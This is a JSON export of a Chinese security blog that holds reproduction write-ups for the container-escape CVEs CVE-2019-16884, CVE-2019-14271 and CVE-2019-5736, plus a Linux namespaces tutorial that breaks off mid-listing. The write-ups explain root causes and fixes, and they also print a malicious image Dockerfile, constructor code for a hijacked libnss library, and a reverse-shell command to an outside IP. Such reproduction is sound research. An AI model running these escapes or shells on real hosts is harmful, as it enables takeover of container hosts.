{"meta":{"title":"TARI TARI","subtitle":"","description":"","author":"TARI TARI","url":"https://tari.moe","root":"/"},"pages":[{"title":"","date":"2021-10-03T08:17:24.236Z","updated":"2021-04-01T02:48:42.200Z","comments":true,"path":"404.html","permalink":"https://tari.moe/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2022-04-04T07:12:27.994Z","updated":"2022-04-04T07:12:27.969Z","comments":true,"path":"about/index.html","permalink":"https://tari.moe/about/index.html","excerpt":"","text":"欢迎大佬来访, 本小破站主要用于个人记录 ~ Web 小菜一枚, 喜欢 CTF, 精通各大CTF赛事的签到题 ( 毕业于佛科院 (佛大, 等学校啥时候改名字, 就可以换了 耶~) 在校期间主要负责学校服务器安全运维、内网渗透、组织参加CTF、开发一些小工具… 简而言之就是多功能搬砖人, 哪里需要搬哪里 Sangfor ing… 欢迎各位评论留言一起讨论各种琐琐碎 ~ 近期博客对URL格式进行一些调整，因此每篇文章的访问量都重置了…"},{"title":"我滴朋友们","date":"2021-10-03T08:17:24.239Z","updated":"2021-04-01T07:30:59.293Z","comments":true,"path":"friends/index.html","permalink":"https://tari.moe/friends/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2021-10-03T08:17:22.677Z","updated":"2021-04-01T02:44:50.837Z","comments":true,"path":"tags/index.html","permalink":"https://tari.moe/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"容器逃逸之AppArmor绕过-CVE-2019-16884复现","slug":"2023/CVE-2019-16884","date":"2023-02-18T07:11:38.000Z","updated":"2023-02-18T07:12:58.554Z","comments":true,"path":"/p/2023/CVE-2019-16884/","link":"","permalink":"https://tari.moe/p/2023/CVE-2019-16884/","excerpt":"","text":"漏洞环境环境部署 (X) 1./metarget cnv install cve-2019-16884 不过有个坑，这里自动搭建的 runc 版本有点问题，见 issue89 这里使用 ssst0n3 大佬的镜像 123docker network create testdocker run --network=test -d -p 2222:22 ssst0n3/docker_archive:ubuntu-20.04_docker-ce-19.03.2_docker-ce-cli-19.03.2_containerd.io-1.2.6-3_runc-1.0.0-rc8ssh -p 2222 root@127.0.0.1 一定要创建网络噢，否则SSH连不上去 漏洞影响版本 runC &lt;= 1.0.0-rc8 (Docker &lt; 19.03.1) 漏洞与 AppArmor 有关 漏洞描述 在容器镜像中可以声明一个VOLUME, 挂载至/proc, 欺骗runc使其认为AppArmor已经成功应用，从而绕过AppArmor策略。 AppArmor相信不少同学在Centos搭建环境被 SELinux 坑过不少，AppArmor 作为 SELinux 代替品出现，是一个Linux内核安全模块，允许系统管理员通过每个程序的配置文件限制程序的功能，上手和易用性比SELinux友好太多。 该模块可以从宿主机中设置相应的规则，限制容器内的文件能不能从容器内被读写执行， 12cat /sys/module/apparmor/parameters/enabled # 查看是否开启apparmor，返回为Y表示开启cat /sys/kernel/security/apparmor/profiles # 查看加载的配置文件 Docker 在 Linux 中也是通过查看 /sys/module/apparmor/parameters/enabled 判断宿主机是否开启 AppArmor，如不开启则开启Docker默认AppArmor策略。具体runC在启动容器时会尝试加载AppArmor策略：将 exec+AppArmor策略文件路径写入 /proc/self/attr/exec，可参考源码，后面/proc/&lt;pid&gt;/attr会在使用主要的安全模块时使用到。 https://www.kernel.org/doc/html/latest/admin-guide/LSM/index.html Process attributes associated with “major” security modules should be accessed and maintained using the special files in /proc/…/attr. A security module may maintain a module specific subdirectory there, named after the module. /proc/…/attr/smack is provided by the Smack security module and contains all its special files. The files directly in /proc/…/attr remain as legacy interfaces for modules that provide subdirectories. 修改/proc/self/attr/exec内容，可以在exec时修改限制策略。 https://gitlab.com/apparmor/apparmor/-/wikis/AppArmorinterfaces#procselfattrexec The /proc/self/attr/exec file can be written to change the tasks confinement at exec time. It is used to perform the change_onexec operation. 漏洞分析CVE-2019-16884 可以使得用户绕过AppArmor的一些策略进而可以实现一些越权操作，上面提到 docker 加载 AppArmor 是通过写入 /proc/self/attr/exec 实现的，我们可以通过挂在 /proc 卷让 runC 误认为它已成功加载 AppArmor 策略。 不过 runc 在挂载时 checkMountDestination 方法有对 /proc 进行黑名单校验 https://github.com/opencontainers/runc/blob/7507c64ff675606c5ff96b0dd8889a60c589f14d/libcontainer/rootfs_linux.go#L414-L419 https://github.com/opencontainers/runc/blob/7507c64ff675606c5ff96b0dd8889a60c589f14d/libcontainer/rootfs_linux.go#L467-L501 第2个链接如下代码判断存在逻辑问题 123456789for _, invalid := range invalidDestinations &#123; path, err := filepath.Rel(filepath.Join(rootfs, invalid), dest) if err != nil &#123; return err &#125; if path != &quot;.&quot; &amp;&amp; !strings.HasPrefix(path, &quot;..&quot;) &#123; return fmt.Errorf(&quot;%q cannot be mounted because it is located inside %q&quot;, dest, invalid) &#125;&#125; 经调试，rootfs 和 dest 依次为 12rootfs: /var/lib/docker/overlay2/059ee72cfdfb48906c8cee6d34eaea3dbe912a31320cbb749ff5dc39347385de/mergeddest: /var/lib/docker/overlay2/059ee72cfdfb48906c8cee6d34eaea3dbe912a31320cbb749ff5dc39347385de/merged/proc https://go.dev/play/p/-kUMChatabH 输出 123. &lt;nil&gt;Program exited. 也就是说黑名单没有起作用！缺少了个 path==&quot;.&quot; 的判断，如有正确判断，checkMountDestination 方法会返回异常 调用链为 libcontainer.Init() -&gt; prepareRootfs() -&gt; mountToRootfs() -&gt; checkMountDestination() –&gt; apparmor.ApplyProfile(l.config.AppArmorProfile) 可以注意到，应用 AppArmor 在挂载 rootfs 之后，Debug 一下确实是如此。前面我们知道 AppArmor 通过写入 /proc/self/attr/exec 去写入 AppArmor 规则的，那按理说，我们在先伪造 /proc 目录，然后 AppArmor 还是可以正常写入 /proc/self/attr/exec 才对？因为我一开始是想着 AppArmor 先写入，然后被我们伪造的 /proc 路径给覆盖了。既然能正常写入 /proc/self/attr/exe 那为啥还能bypass apparmor呢？ 这边调试一下，确保 AppArmor 文件确实写进去了， 执行一下 ls 命令是为了确定是否进入到容器里面了 获取 /proc/self/attr/exec 内容确实写入了，但为啥 /flag 还是能正常读取？ 因为写入 runc 产生的 procfs 因为他的 procfs 是容器的，每个进程运行时才能看到他们进程自己专属的 /proc/self 目录，自己伪造的是一个真实的文件系统 没有这种特性 漏洞利用ssh 登陆至容器，注意不能 docker exec 进入，因为这个镜像里面通过 qemu 模拟了一个镜像，这个镜像才是漏洞环境 12root@cloud_shoot ~# ssh -p 2222 root@127.0.0.1root@127.0.0.1&#x27;s password:root 创建apparmor规则 123456789cat &gt; /etc/apparmor.d/no_flag &lt;&lt;EOF#include &lt;tunables/global&gt;profile no_flag flags=(attach_disconnected,mediate_deleted) &#123; #include &lt;abstractions/base&gt; file, deny /flag r,&#125;EOF 应用规则 1/sbin/apparmor_parser --replace --write-cache /etc/apparmor.d/no_flag 随便建个 flag 文件 1echo &quot;flag&#123;123-123&#125;&quot; &gt; /tmp/flag 启动一个正常镜像，无权限读取/flag内容 1docker run --rm --security-opt &quot;apparmor=no_flag&quot; -v /tmp/flag:/flag busybox cat /flag 创建一个恶意镜像 12345678910111213mkdir apparmor-bypass/ &amp;&amp; cd apparmor-bypass/mkdir -p rootfs/proc/self/&#123;attr,fd&#125;touch rootfs/proc/self/&#123;status,attr/exec&#125;touch rootfs/proc/self/fd/&#123;4,5&#125;cat &lt;&lt;EOF &gt; DockerfileFROM busyboxADD rootfs /VOLUME /procEOFdocker build -t apparmor-bypass . 利用 1docker run --rm --security-opt &quot;apparmor=no_flag&quot; -v /tmp/flag:/flag apparmor-bypass cat /flag 漏洞修复https://github.com/opencontainers/runc/compare/7507c64ff675606c5ff96b0dd8889a60c589f14d...v1.0.0-rc9 在执行mount操作前，检查目的路径是否为/proc或位于/proc下, 如果是，则必须为procfs 1234567891011121314151617if path == &quot;.&quot; &#123; // an empty source is pasted on restore if source == &quot;&quot; &#123; return nil &#125; // only allow a mount on-top of proc if it&#x27;s source is &quot;proc&quot; isproc, err := isProc(source) if err != nil &#123; return err &#125; // pass if the mount is happening on top of /proc and the source of // the mount is a proc filesystem if isproc &#123; return nil &#125; return fmt.Errorf(&quot;%q cannot be mounted because it is not of type proc&quot;, dest)&#125; 其他关于断点调试点一些小坑 因为 docekr 的各个组件的调用顺序是 docker run -&gt; dockerd -&gt; containerd -&gt; containerd-shim -&gt; runc ，因为 runc 是 cli 来的，我们并不知道入参是什么，这里用了个笨方法，依次拉 docker cli、dockerd、containerd 和 runc 的代码下来，然后 docker cli -&gt; dockerd 是 HTTP REST 请求，dockers -&gt; containerd 是 gRPC 请求，经 debug 发现 dockerd 通过 containerd 依赖的 client 去 gRPC调用。然后调用 containers-shim 以及 containers-shim 调 runc 通过系统命令调用，一开始在 moby 库找了很多 runc 代码发现没有 rootfs.go 这个文件，原来是 moby 并没有直接依赖 runc 的这部分代码。 各个版本 docker-ce-19.03.2 docker-ce-cli-19.03.2 containerd.io-1.2.6-3 runc-1.0.0-rc8 注意低版本编译默认没有开启 apparmor 选项，-tags &quot;seccomp apparmor&quot; seccomp 选项需要安装依赖 apt install pkg-config apt install libseccomp-dev 参考链接https://www.anquanke.com/post/id/265343 https://mp.weixin.qq.com/s/snd1mrEeFheEPB_wrPv8XA https://ssst0n3.github.io/post/网络安全/安全研究/容器安全/进程容器/服务器容器/docker/docker安全的关键技术/linux内核安全机制/LSM/apparmor/docker中apparmor的加载过程.html","categories":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"容器逃逸","slug":"云安全/容器逃逸","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"name":"漏洞复现","slug":"云安全/容器逃逸/漏洞复现","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://tari.moe/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://tari.moe/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"}]},{"title":"moby容器逃逸-CVE-2019-14271复现","slug":"2023/CVE-2019-14271","date":"2023-02-18T02:36:48.000Z","updated":"2023-02-18T03:14:29.897Z","comments":true,"path":"/p/2023/CVE-2019-14271/","link":"","permalink":"https://tari.moe/p/2023/CVE-2019-14271/","excerpt":"","text":"漏洞环境环境部署 1./metarget cnv install cve-2019-14271 漏洞影响版本 Docker &lt; 19.03.1 拉一个 alpine 镜像 12docker pull alpinedocker run -itd --name=14271 alpine /bin/sh 这里如果用 ubuntu 镜像会出现问题 12Error response from daemon: error processing tar file: docker-tar: relocation error: /lib/x86_64-linux-gnu/libnss_files.so.2: symbol __libc_readline_unlocked version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference: exit status 127 不过后面利用的时候好像 ubuntu 镜像又好了，很神奇… 漏洞描述 The vulnerability can be exploited, provided that a container has been compromised by a previous attack (e.g. through any other vulnerability, leaked secrets, etc.), or when a user runs a malicious container image from an untrusted source (registry or other). If the user then executes the vulnerable cp command to copy files out of the compromised container, the attacker can escape and take full root control of the host and all other containers in it. 前置知识docker cp 命令是用来在容器和宿主机之间拷贝文件的，比如把容器中的 /var/logs 目录拷贝到本机 1docker cp container_name:/var/logs /some/host/path 这里在容器内通过 dd 在 /var/log 新建了个大文件，以便于捕捉复制文件时的进程。如下，当我们执行 docker cp 时，通过 ps 看到运行了一个 docker-tar 的进程从容器内打包文件 123docker cp 14271:/var/log log &amp;ps afx | grep -v grep | grep -B 1 docker-tarls -l /proc/[docker-tar-pid]/root /var/lib/docker/overlay2/3f5442ab960e56e8e34cfda288b5ec4d313b51b53319e4671a8d8add0c397369/merged/ 为容器文件系统根目录，var/log 即为日志目录 通过查看进程的根目录发现 ls -l /proc/29989/root ，执行 docker-tar 时会 chroot 至容器目录，因为这可以避免一些恶意软链接文件至宿主问题。尽管 chroot 至容器可以避免恶意软链接，但通过CVE-2019-14271 仍可进行逃逸 漏洞分析Docker主要是通过Go编写，存在 漏洞Docker版本通过Go 1.11 编译，这个版本一些包含嵌入式C代码（cgo）会在运行时动态加载共享库。docker-tar 使用了 net 和 os/user 包，它们在运行时都会加载 libnss_*.so 动态链接库，本来是没有问题的，因为是加载宿主机上的 .so ，但打包容器内的文件时，会通过 chroot 进入容器内，导致加载了容器内的 .so，但容器内的 .so 是可被篡改的，而运行打包命令是宿主机环境，从而导致逃逸。 docker-tar 调用栈 https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/init_unix.go#L17 https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/archive_unix.go#L178 https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/archive_unix.go#L135 https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/chroot_linux.go#L105 经分析我们需要构造一个恶意的 .so库，用于加载我们的恶意代码。报错信息写的是加载 libnss_files.so.2 那我们就改这库的源码。查阅文档得知可通过构造方法让进程在加载动态链接库时先初始化构造函数，也就是说 docker-tar 执行时会动态加载我们的恶意库中的恶意函数，简化后的代码如下 12345678910111213141516171819202122232425262728293031323334353637383940#include ...#define ORIGINAL_LIBNSS &quot;/original_libnss_files.so.2&quot;#define LIBNSS_PATH &quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;bool is_priviliged();__attribute__ ((constructor)) void run_at_link(void)&#123; char * argv_break[2]; if (!is_priviliged()) return; rename(ORIGINAL_LIBNSS, LIBNSS_PATH); fprintf(log_fp, &quot;switched back to the original libnss_file.so&quot;); // success return 0 if (!fork()) &#123; // Child runs breakout argv_break[0] = strdup(&quot;/breakout&quot;); argv_break[1] = NULL; execve(&quot;/breakout&quot;, argv_break, NULL); &#125; else wait(NULL); // Wait for child return;&#125;bool is_priviliged()&#123; FILE * proc_file = fopen(&quot;/proc/self/exe&quot;, &quot;r&quot;); if (proc_file != NULL) &#123; fclose(proc_file); return false; // can open so /proc exists, not privileged &#125; return true; // we&#x27;re running in the context of docker-tar&#125; 此函数通过检测 /proc 目录是否为空来判断自己是否运行在 docker-tar 上下文中，如为空则是运行在 docker-tar 上下文中，如非空则为其他正常的容器进程加载这个动态链接库，因为 /proc 上的procfs挂载只存在于容器挂载上下文中。 如果是通过 docker-tar 调用的此库，先把恶意库恢复为原来的，防止其他进程再一次出发我们的脚本，其中 /breakout 是我们要运行的shell脚本，方便我们改要运行的命令 据说漏洞发现是由一个外国老哥遇到一个docker cp 复制文件问题引起的https://github.com/moby/moby/issues/39449 ，报错信息写着加载到了 libnss_files.so.2 文件 漏洞利用执行docker cp后即触发漏洞主要有两种方式 拉取一个攻击者构造恶意 libnss_*.so 动态链接库的容器 攻击者获取到容器内一定权限，可以替换 libnss_*.so 漏洞利用exp下载：https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-cve-2019-14271/exp 12345678910docker run -itd --name=14271 ubuntu bashdocker cp exp/ 14271:/docker exec -it 14271 bashls /expbreakout libnss_files.so.2 original_libnss_files.so.2cp /exp/* /chmod 777 /breakouttouch /logsrm /lib/x86_64-linux-gnu/libnss_files.so.2mv /libnss_files.so.2 /lib/x86_64-linux-gnu/ 漏洞修复https://github.com/moby/moby/pull/39612/files 在 chrootarchive 包初始化时先加载 libnss 动态链接库，因为 user 和 net 这两个包的方法会加载到，只要调用了， 这时加载是从宿主机加载 libnss 动态链接库，宿主机的库从容器内无法更改，从而避免逃逸问题。 关于漏洞修复 ssst0n3 师傅分析的更为深入，膜拜 https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/docker-software/plumbing/docker-cp/CVE-2019-14271/%E5%88%86%E6%9E%90/CVE-2019-14271%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html 参考https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/","categories":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"容器逃逸","slug":"云安全/容器逃逸","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"name":"漏洞复现","slug":"云安全/容器逃逸/漏洞复现","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://tari.moe/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://tari.moe/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"}]},{"title":"runC容器逃逸-CVE-2019-5736复现","slug":"2023/CVE-2019-5736","date":"2023-02-18T02:18:10.000Z","updated":"2023-02-18T03:14:19.769Z","comments":true,"path":"/p/2023/CVE-2019-5736/","link":"","permalink":"https://tari.moe/p/2023/CVE-2019-5736/","excerpt":"","text":"漏洞环境环境部署 1./metarget cnv install cve-2019-5736 漏洞影响版本 runC &lt; 1.0-rc6 （docker &lt; 18.09.2） 利用条件 需要在容器内具有 root 权限，才能覆盖runC文件 漏洞描述 runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe. 环境版本信息 123456root@cloud_shoot /o/metarget# docker -vDocker version 18.03.1-ce, build 9ee9f40root@cloud_shoot /o/metarget# docker-runc -vrunc version 1.0.0-rc5commit: 4fc53a81fb7c994640722ac585fa9ca548971871spec: 1.0.0 拉一下 docker 镜像 12docker pull ubuntudocker run -it ubuntu /bin/bash 前置知识漏洞描述中说漏洞主要由runC引起的，那什么是 runC？ https://os.51cto.com/article/697381.html runC 最初是Docker的一般分核心代码，用于底层容器运行时，被 Docker （”高层次”）调度用来运行容器，后面被单独开源出来了。这里的 “高层次” 是指 容器的镜像创建、管理，创建容器、进入正在运行中的容器 (docker exec) 等功能 为了防止容器内执行的命令对宿主机造成影响，runC 会创建一个 runC init 的带有命名空间限制的子进程，使得让其可以安全的运行在容器中，然后用户在容器调用命令时，底层通过运行execve系统调用 在新的（容器内）命名空间执行。创建新的容器和从宿主机进入到容器内也是这样操作的。 现在问题就是在，runC init 运行时，是直接指向宿主机的 runC 的，也就是说攻击者通过重写 /proc/self/exe 的方式，待用户从宿主机进入容器时，即会篡改宿主机的 runC，最终运行篡改后的 runC 从而造成宿主机命令执行。 那为啥不直接篡改 /proc/[runc-init-pid]/exe ，非得受害者从宿主机进入才能触发漏洞呢？（毕竟篡改了runC，docker在执行很多容器相关操作时都会调用到runC，这样就可以做到被动出发这个漏洞了） 这都从CVE-2016-9962说起，它是一个能遍历宿主机目录的漏洞。这个漏洞补丁，是在从宿主机进入容器前 runC init 进程不会影响至宿主机的文件，然后进入容器执行execve后会把相关标记位去除，即可影响宿主机上的runC。 漏洞分析进入拉取的 ubuntu 容器 1docker exec -it angry_brahmagupta /bin/bash 首先，/proc 目录是Linux里记录进程运行信息的虚拟文件系统（运行在内存中，非真正存在于硬盘中），一般都是挂载在 /proc，我们可以认为是内核映射出来的，每个进程都有它自己的目录 /proc/&lt;pid&gt;。然后 /proc/self 表示当前进程所在目录，是 /proc/&lt;pid&gt; 的软链接。对于本漏洞来说，进程目录有1个文件和1个目录需要关注的 /proc/self/exe 当前进程运行着的可执行文件等软链接 /proc/self/fd 包含了当前进程打开的文件描述符 运行 /proc/self/exe --help 发现是个 bash 程序，因为我们是运行 /bin/bash 进入的，并以 /bin/bash 执行，而 /proc/self 目录记录的是当前进程的运行信息，/proc/self/exe 是内核为每个进程创建的指向该进程执行二进制文件的软链接。如果在容器内执行 /bin/bash ，最终执行的是 /proc/self/exe ，然后 /proc/self/exe 指向宿主机的 runc 可执行文件。 如果我们能够改写 /proc/self/exe 那么就可以改写 runc ，又因进入容器时执行的命令会执行 runc, 那么我们就可以在宿主机上执行任意命令了。 这里存在一个问题，当我们进入容器时，runc 执行，但处理执行中的文件是无法被写入的，但它运行完我们 /proc/[runc-pid]/ 目录又会不见了，我们需要记录它。刚刚提及到 /proc/self/fd 的作用，即我们发现 runc 在执行后，通过我们的脚本马上打开它 /proc/[runc-pid]/exe，然后在 /proc/self/fd/xx 就能找到我们打开的 /proc/[runc-pid]/exe，等 runc 执行完后，马上写入它，就可以修改宿主机的 runc 了 漏洞利用主要有两种利用方式 拉取一个攻击者构造的容器，启动后即触发重写 /proc/self/exe 的程序，可见此 攻击者获取到容器内的 root 权限，运行漏洞EXP，导致受害者在进入容器时宿主机 runc 被执行攻击者构造的命令。下面即演示这种方式 如果在本机实验，因为漏洞利用会重写 runC，所以请先备份一下 docker-runc 或 runc，或者给虚拟机打个快照（建议快照，本机尝试恢复 docker-runc 无法恢复 docker exec -it 功能） 12whereis docker-runccp /usr/bin/docker-runc /xxx/docker-runc-bak https://github.com/Frichetten/CVE-2019-5736-PoC 编译EXP 1GOOS=linux GOARCH=amd64 go build -o cve-2019-5736 main.go 生成的EXP放到受害者容器内执行 1./cve-2019-5736 -shell &quot;/bin/bash -i &gt;&amp; /dev/tcp/172.23.204.36/2233 0&gt;&amp;1&quot; 受害者进入容器 1docker exec -it angry_brahmagupta /bin/sh 注意受害者必须以 /bin/sh 进入容器才能正常执行命令 漏洞修复https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d 从宿主机进入容器，即在执行 /proc/self/exe 时，通过 memfd_create 函数先为其在内存中创建一个宿主机 runc 的不可写( O_RDONLY | O_CLOEXEC )临时副本，副本仅可读可执行，且与宿主机 runc 无关，即使能可写也不会影响到宿主机的 runc 从而避免容器逃逸 参考https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/","categories":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"容器逃逸","slug":"云安全/容器逃逸","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"name":"漏洞复现","slug":"云安全/容器逃逸/漏洞复现","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://tari.moe/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://tari.moe/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"}]},{"title":"Linux命名空间机制及其隔离不当导致的漏洞","slug":"2022/linux-namespace","date":"2022-12-25T01:34:42.000Z","updated":"2022-12-25T02:26:19.238Z","comments":true,"path":"/p/2022/linux-namespace/","link":"","permalink":"https://tari.moe/p/2022/linux-namespace/","excerpt":"","text":"最近（其实年中的时候写好了，一直忘了发出来..）在学习云和容器相关的知识，经过复现几个漏洞和DEBUG Docker 各个部件的源码发现在Linux底层是依靠Linux命名空间和Cgroups对资源进行隔离，这里打算深入学习一下Linux底层知识。 历史Linux命名空间灵感源自Unix系统命名空间功能，从2002年2.4.19内核版本开始集成至Linux中，Linux内核3.8中引入用户命名空间提供了足够容器支持功能，并逐步发展至今， 命令空间类型Linux 内核经过迭代版本变更共提供 8 种命名空间（表1） 类型 功能说明 内核 Mount (mnt) 挂载点和文件系统隔离 2.4.19[2] UTS 主机名隔离 2.6.19[3] Interprocess Communication (ipc) 进程间通信隔离 2.6.19[4] Process ID (pid) 进程隔离 2.6.24[5] Network (net) 网络隔离 2.6.29[6] User ID (user) 用户隔离 3.8[7] Control group (cgroup) 系统资源使用隔离 4.6[8] Time Namespace 系统时间隔离 5.6[9] 进程命名空间是嵌套的，即当一个进程被创建时，从其当前命名空间到其初始化命名空间，每个命名空间都有一个pid，而且有个规律：子进程的pid比父进程的小。 pid 还有一个比较有意思的知识，Linux 系统中 pid 为 1 是系统启动后创建的第1个进程，或者叫 init process，它有一个特征是 orphaned processes 孤立进程附加到这上面，也就是说，如果 pid 1 被 kill 后，他立刻会终结附加到其上的所有子进程，不过默认 pid 1 是被保护起来的，无法正常通过 kill -9 1 等 kill 操作杀死，以保证操作系统的稳定运行，不过可以通过 gdb[10] 来干掉：gdb -p 1 后执行 kill pid 这里有一个大家可能已用过的案例，即WSL无法使用systemctl的解决方案，因为WSL初始PID不是1，所以用不了，通过把自己隔离让自己看到自己的PID为1 User ID (user) 提供的用户隔离正是容器化的开始，因为他可以摒弃传统的用户权限分级和控制手段。比如一个命名空间内，可以让其认为自己是 root (uid=0)，但实际上 uid是1400000，用户命名空间也是嵌套的 Control group (cgroup) 比如限制某个容器能使用几个CPU，多少内存的特性就是因为这个命名空间 其中 Network 和 User 在Linux 2.6.24 和 2.6.23 已有，到表中记录版本才完善 确认当前 bash进程的PID 和 各个namespace，中括号内为 namespace 编号 实现命名空间主要是3个系统调用 clone() 实现线程的系统调用，用来创建一个新的进程，并可以通过设置命名空间类型参数达到隔离。 unshare() 使某进程脱离某个namespace setns() 把某进程加入到某个namespace mnt隔离[11]没有隔离的mount 为了简单起见使用tmpfs这种基于内存的文件系统来模拟 123456echo $$mkdir /tmp/noisolationmount -t tmpfs tmpfs /tmp/noisolation/cd /tmp/noisolation/touch aaa bbb ccc dddll 新起一个 bash，文件存在 12345678910root@cloud_shoot:~# echo $$20434root@cloud_shoot:~# ll /tmp/noisolation/total 4drwxrwxrwt 2 root root 120 May 26 09:36 ./drwxrwxrwt 10 root root 4096 May 26 09:38 ../-rw-r--r-- 1 root root 0 May 26 09:36 aaa-rw-r--r-- 1 root root 0 May 26 09:36 bbb-rw-r--r-- 1 root root 0 May 26 09:36 ccc-rw-r--r-- 1 root root 0 May 26 09:36 ddd 有隔离的 mount先创建个测试目录 1mkdir /tmp/isolation Linux内核也提供系统函数实现[12]，这里直接使用Linux unshare命令实现隔离 使用 unshare 隔离 mnt namespace 123echo $$unshare --mount /bin/bashecho $$ 可以清楚看到两个进程为父子进程关系.20516 12ps -ef | grep 20516 | grep -v greppstree -p | grep 20526 在 20526 即隔离 namespace 中挂载 tmpfs 目录和文件 12345echo $$mount -t tmpfs tmpfs /tmp/isolationcd /tmp/isolation/touch aaa bbb ccc dddll 查看该 namespace 的编号，发现只有 mnt 改变了 在新起的终端确认 /tmp/isolation 文件内容，文件不存在 1ll /tmp/isolation/ 那其他命名空间呢？ C实现命名空间隔离实验[13] [14]clone()系统调用clone.c 123456789101112131415161718192021222324252627282930313233343536#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;/* 定义一个给 clone 用的栈，栈大小1M */#define STACK_SIZE (1024 * 1024)static char container_stack[STACK_SIZE];char* const container_args[] = &#123; &quot;/bin/bash&quot;, NULL&#125;;int container_main(void* arg)&#123; printf(&quot;Container - inside the container!\\n&quot;); /* 直接执行一个shell，以便我们观察这个进程空间里的资源是否被隔离了 */ execv(container_args[0], container_args); printf(&quot;Something&#x27;s wrong!\\n&quot;); return 1;&#125;int main()&#123; printf(&quot;Parent - start a container!\\n&quot;); /* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */ int container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD, NULL); /* 等待子进程结束 */ waitpid(container_pid, NULL, 0); printf(&quot;Parent - container stopped!\\n&quot;); return 0;&#125; 直接启用通过execv启用一个子进程，到新的 /bin/bash 环境，这里没做任何隔离，父进程能做的子进程基本都可以做 UTS Namespace可通过 clone() 函数设置 CLONE_NEWUTS 标志位实现，需要 root 权限uts_ns.c 123456789101112131415161718192021222324252627282930313233343536#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;/* 定义一个给 clone 用的栈，栈大小1M */#define STACK_SIZE (1024 * 1024)static char container_stack[STACK_SIZE];char* const container_args[] = 